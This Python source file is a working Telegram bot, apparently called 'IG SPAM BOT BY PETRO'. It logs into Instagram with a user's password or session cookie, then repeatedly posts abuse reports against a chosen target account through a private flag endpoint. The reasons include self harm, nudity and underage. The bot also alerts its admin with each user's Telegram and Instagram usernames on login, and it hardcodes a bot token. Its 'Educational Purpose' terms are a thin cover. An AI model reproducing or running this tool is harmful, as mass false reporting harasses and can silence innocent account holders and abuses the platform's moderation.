import telebot
from telebot import types
from requests import post, get
import requests, os, re, uuid, time
from datetime import datetime
import threading
import json
from concurrent.futures import ThreadPoolExecutor

# ---------------- CONFIGURATION ---------------- #
BOT_TOKEN = "8577308339:AAHz19s_PevqgcKJmWsQZzZsmGg9-EiT2o" 
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

ADMIN_IDS = [7146242501]  

# Thread Pool limits simultaneous threads to prevent "can't start new thread" error
executor = ThreadPoolExecutor(max_workers=50)

expiration_date = datetime(2027, 12, 31)
if datetime.now() > expiration_date:
    print("❌ Tool License Expired.")
    exit()

uid = str(uuid.uuid4())
sessions = {}          
report_threads = {}    
known_users = set()    

# ---------------- NOTIFICATION HELPERS ---------------- #
def notify_admins(text):
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, text)
        except Exception as e:
            print(f"Failed to notify admin {admin_id}: {e}")

def get_tg_username(chat_id):
    try:
        chat = bot.get_chat(chat_id)
        return f"@{chat.username}" if chat.username else f"{chat.first_name}"
    except:
        return "Unknown"

# ---------------- MARKUP HELPERS ---------------- #
def main_menu_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🔑 Login (Pass)", callback_data='login_pass')
    btn2 = types.InlineKeyboardButton("🍪 Login (Session)", callback_data='login_session')
    btn3 = types.InlineKeyboardButton("🚀 Start Report", callback_data='start_report')
    btn4 = types.InlineKeyboardButton("🛑 Stop", callback_data='stop_report')
    btn5 = types.InlineKeyboardButton("👤 My Info", callback_data='my_info')
    btn6 = types.InlineKeyboardButton("📜 Terms", callback_data='terms')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return markup

def back_home_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back to Menu", callback_data='main_menu'))
    return markup

# ---------------- REPORTING LOGIC ---------------- #
def animate_message(chat_id, msg_id, stop_event):
    animation = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    i = 0
    while not stop_event.is_set():
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"<b>⏳ Reporting in progress... {animation[i % len(animation)]}</b>")
            i += 1
            time.sleep(0.5)
        except:
            break

def report_instagram(chat_id, target_id, sessionid, csrftoken, reportType, delay, stop_event):
    msg = bot.send_message(chat_id, "<b>🚀 Initializing Attack Sequence...</b>")
    
    executor.submit(animate_message, chat_id, msg.message_id, stop_event)
    
    count = 0
    errors = 0

    while not stop_event.is_set():
        try:
            url = f"https://i.instagram.com/users/{target_id}/flag/"
            headers = {
                "User-Agent": "Instagram 114.0.0.38.120 Android",
                "Host": "i.instagram.com",
                'Cookie': f"sessionid={sessionid}; csrftoken={csrftoken}",
                "X-CSRFToken": csrftoken,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Connection": "keep-alive"
            }
            data = f'source_name=&reason_id={reportType}&frx_context='
            
            r3 = post(url, headers=headers, data=data, allow_redirects=False, timeout=10)
            
            if r3.status_code == 429:
                stop_event.set()
                bot.send_message(chat_id, "<b>⚠️ Rate Limit Hit (429).</b>")
                break
            elif r3.status_code in [200, 201]:
                count += 1
                if count % 5 == 0:
                    bot.send_message(chat_id, f"✅ <b>{count} Reports Sent Successfully.</b>")
            elif r3.status_code == 404:
                stop_event.set()
                bot.send_message(chat_id, "<b>❌ Target Not Found (404).</b>")
                break
            else:
                errors += 1
                if errors > 15:
                    stop_event.set()
                    bot.send_message(chat_id, "<b>❌ Too many errors. Stopping.</b>")

            for _ in range(delay):
                if stop_event.is_set(): break
                time.sleep(1)

        except Exception as e:
            stop_event.set()
            bot.send_message(chat_id, f"❌ <b>Critical Error:</b> {str(e)}")
            break

    try:
        bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=f"🛑 <b>Reporting Finished.</b>\nTotal Sent: {count}")
    except:
        pass

    if chat_id in report_threads:
        del report_threads[chat_id]

# ---------------- AUTHENTICATION ---------------- #
def login_user(chat_id, username, password):
    msg_load = bot.send_message(chat_id, "<i>🔐 Authenticating...</i>")
    try:
        r1 = post(
            'https://i.instagram.com/api/v1/accounts/login/',
            headers={'User-Agent': 'Instagram 114.0.0.38.120 Android'},
            data={'_uuid': uid, 'password': password, 'username': username, 'device_id': uid, 'from_reg': 'false', '_csrftoken': 'missing', 'login_attempt_count': '0'},
            timeout=15
        )

        if 'logged_in_user' in r1.text:
            sessionid = r1.cookies.get('sessionid')
            csrftoken = r1.cookies.get('csrftoken', 'missing')
            sessions[chat_id] = {'username': username, 'sessionid': sessionid, 'csrftoken': csrftoken}
            bot.delete_message(chat_id, msg_load.message_id)
            
            notify_admins(f"🔐 <b>LOGIN</b>\n👤 TG: {get_tg_username(chat_id)}\n📸 IG: {username}")
            bot.send_message(chat_id, f"<b>✅ Login Successful!</b>", reply_markup=main_menu_keyboard())
        else:
            bot.edit_message_text(chat_id=chat_id, message_id=msg_load.message_id, text=f"❌ <b>Login Failed.</b>")
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_load.message_id, text=f"❌ Error: {str(e)}")

def validate_session(chat_id, session_id):
    msg_load = bot.send_message(chat_id, "<i>🔄 Validating...</i>")
    try:
        headers = {'User-Agent': 'Instagram 114.0.0.38.120 Android', 'Cookie': f'sessionid={session_id}'}
        r = requests.get('https://i.instagram.com/api/v1/accounts/current_user/', headers=headers, timeout=10)
        
        if r.status_code == 200:
            data = r.json()
            username = data.get('user', {}).get('username', 'Unknown')
            csrftoken = r.cookies.get('csrftoken', 'missing')
            sessions[chat_id] = {'username': username, 'sessionid': session_id, 'csrftoken': csrftoken}
            bot.delete_message(chat_id, msg_load.message_id)
            
            notify_admins(f"🍪 <b>SESSION LOGIN</b>\n👤 TG: {get_tg_username(chat_id)}\n📸 IG: {username}")
            bot.send_message(chat_id, f"<b>✅ Session Valid!</b>", reply_markup=main_menu_keyboard())
        else:
            bot.edit_message_text(chat_id=chat_id, message_id=msg_load.message_id, text="❌ <b>Invalid Session.</b>")
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_load.message_id, text=f"❌ Error: {str(e)}")

# ---------------- BOT HANDLERS ---------------- #
@bot.message_handler(commands=['start', 'help'])
def start_handler(message):
    chat_id = message.chat.id
    if chat_id not in known_users:
        known_users.add(chat_id)
        notify_admins(f"🔔 <b>NEW USER</b>\n👤 {message.from_user.first_name}\n🆔 {message.from_user.id}")

    bot.send_message(chat_id, "🔥 <b>IG SPAM BOT BY PETRO</b>\n━━━━━━━━━━━━━━", reply_markup=main_menu_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id

    if call.data == 'main_menu':
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔥 <b>Main Menu</b>", reply_markup=main_menu_keyboard())
    elif call.data == 'terms':
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="📜 <b>Terms: Educational Purpose.</b>", reply_markup=back_home_keyboard())
    elif call.data == 'login_pass':
        msg = bot.send_message(chat_id, "✏️ <b>Enter IG Username:</b>")
        bot.register_next_step_handler(msg, ask_password)
    elif call.data == 'login_session':
        msg = bot.send_message(chat_id, "🍪 <b>Paste sessionid:</b>")
        bot.register_next_step_handler(msg, lambda m: validate_session(chat_id, m.text.strip()))
    elif call.data == 'stop_report':
        if chat_id in report_threads:
            report_threads[chat_id].set()
            bot.answer_callback_query(call.id, "🛑 Stopping...")
        else:
            bot.answer_callback_query(call.id, "No active reports.")
    elif call.data == 'start_report':
        if chat_id not in sessions:
            bot.answer_callback_query(call.id, "❌ Login Required!", show_alert=True)
            return
        msg = bot.send_message(chat_id, "🎯 <b>Enter Target Username:</b>")
        bot.register_next_step_handler(msg, ask_report_type_menu)

# ---------------- INPUT STEPS (UPDATED WITH ALL REASONS) ---------------- #
def ask_password(message):
    username = message.text
    msg = bot.send_message(message.chat.id, "🔑 <b>Enter Password:</b>")
    bot.register_next_step_handler(msg, lambda m: login_user(message.chat.id, username, m.text))

def ask_report_type_menu(message):
    chat_id = message.chat.id
    target = message.text
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    
    # ALL YOUR REASONS ADDED HERE
    options = [
        "1 - Spam", "2 - Self Harm", "4 - Nudity", "5 - Violence", 
        "6 - Hate Speech", "7 - Harassment", "8 - Impersonation",
        "11 - Underage", "12 - sale or promotion", "13 - invisible"
    ]
    
    # Adding buttons in rows of 2 for better visibility
    for i in range(0, len(options), 2):
        row = [types.KeyboardButton(options[i])]
        if i + 1 < len(options):
            row.append(types.KeyboardButton(options[i+1]))
        markup.add(*row)
        
    msg = bot.send_message(chat_id, f"📝 <b>Reason for {target}:</b>", reply_markup=markup)
    bot.register_next_step_handler(msg, lambda m: ask_report_delay(chat_id, target, m.text))

def ask_report_delay(chat_id, target, choice_text):
    try:
        reportType = int(choice_text.split(" - ")[0])
    except:
        bot.send_message(chat_id, "❌ Invalid selection.", reply_markup=main_menu_keyboard())
        return
    msg = bot.send_message(chat_id, "⏱ <b>Enter delay (sec):</b>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda m: pre_start_check(chat_id, target, reportType, m.text))

def pre_start_check(chat_id, target, reportType, delay_text):
    try:
        delay = int(delay_text)
        if delay < 2: delay = 2
    except:
        delay = 10

    sessionid = sessions[chat_id]['sessionid']
    bot.send_message(chat_id, f"🔎 <b>Scanning for {target}...</b>")
    
    try:
        search_url = 'https://i.instagram.com/api/v1/users/search/'
        headers = {"User-Agent": "Instagram 114.0.0.38.120 Android", "Cookie": f"sessionid={sessionid}"}
        r = requests.get(search_url, params={'q': target, 'count': '1'}, headers=headers, timeout=10)
        data = r.json()
        
        target_id = next((str(u['pk']) for u in data.get('users', []) if u['username'].lower() == target.lower()), None)
        
        if not target_id:
            bot.send_message(chat_id, "❌ <b>Target not found.</b>")
            return
            
        stop_event = threading.Event()
        report_threads[chat_id] = stop_event
        
        # FIXED: Thread Pool usage
        executor.submit(report_instagram, chat_id, target_id, sessionid, sessions[chat_id]['csrftoken'], reportType, delay, stop_event)
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ <b>Error:</b> {e}")

# ---------------- ADMIN COMMANDS ---------------- #
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.chat.id not in ADMIN_IDS: return
    stats = f"👮‍♂️ <b>ADMIN</b>\nUsers: {len(known_users)}\nActive Threads: {len(report_threads)}"
    bot.send_message(message.chat.id, stats)

# ---------------- START ---------------- #
print("--------------------------------")
print("   INSTA REPORTER BOT STARTED   ")
print("--------------------------------")
bot.infinity_polling()